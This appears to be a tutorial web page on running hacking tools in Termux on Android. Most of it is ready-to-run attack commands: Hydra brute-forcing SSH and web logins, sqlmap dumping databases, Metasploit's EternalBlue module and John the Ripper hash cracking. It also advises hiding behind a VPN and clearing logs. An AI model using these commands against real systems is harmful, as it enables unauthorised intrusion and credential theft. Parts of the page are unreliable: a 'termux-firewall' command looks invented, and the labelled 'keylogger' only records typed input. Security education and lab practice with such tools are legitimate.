Essential Termux Hacking Tools

These tools work well on Termux and are regularly updated:

Nmap

Network discovery & security auditing

$ pkg install nmap
$ nmap -sV 192.168.1.1
$ nmap -p 22,80,443 target.com

Termux Note: Requires root for some scan types

Hydra

Password cracking tool

$ pkg install hydra
$ hydra -l admin -P pass.txt ssh://192.168.1.1
$ hydra http-get-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

SQLmap

SQL injection automation

$ pkg install sqlmap
$ sqlmap -u "http://test.com?id=1" --dbs
$ sqlmap -u "http://test.com?id=1" --dump -D database

Metasploit

Penetration testing framework

# Installation:
$ pkg install unstable-repo
$ pkg install metasploit

# Usage:
$ msfconsole
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue

Note: Large package (500MB+)

Termux-shark

Packet capture (Wireshark alternative)

$ pkg install tshark
$ tshark -i wlan0
$ tshark -r capture.pcap -Y "http"

John the Ripper

Password hash cracking

$ pkg install john
$ john --format=raw-md5 hash.txt
$ john --wordlist=rockyou.txt hash.txt

Practical Termux Scripts

1. Basic Network Scanner Script

#!/bin/bash
# Save as scan.sh
echo "Termux Network Scanner"
echo "======================"
read -p "Enter target IP: " target
echo "Scanning $target..."
nmap -sV -O $target
echo "Scan complete!"

2. WiFi Information (No Root)

$ termux-wifi-connectioninfo
$ termux-wifi-scaninfo

# Get IP information
$ ifconfig wlan0
$ ip addr show

3. Create a Simple Keylogger (Educational)

#!/data/data/com.termux/files/usr/bin/python3
import os
import time

log_file = "/sdcard/keylog.txt"

while True:
  key = input("") # Simulating key capture
  with open(log_file, "a") as f:
    f.write(f"[{time.ctime()}] {key}\n")
  print(f"Logged: {key}")

Warning: Only use on YOUR OWN devices for security testing.

Termux Security Guidelines

IMPORTANT SECURITY MEASURES

  • Use a VPN: Always connect through a VPN when testing
  • Isolated Testing: Only test your own devices/lab
  • Regular Updates: Keep Termux and tools updated
  • Permission Control: Grant minimal necessary permissions
  • Log Cleaning: Clear logs after legitimate testing

Secure Your Termux Installation:

# Change default $PREFIX permissions
$ chmod 700 $PREFIX

# Install and use a firewall
$ pkg install termux-tools
$ termux-firewall --enable

# Encrypt sensitive files
$ pkg install gnupg
$ gpg -c secret_file.txt
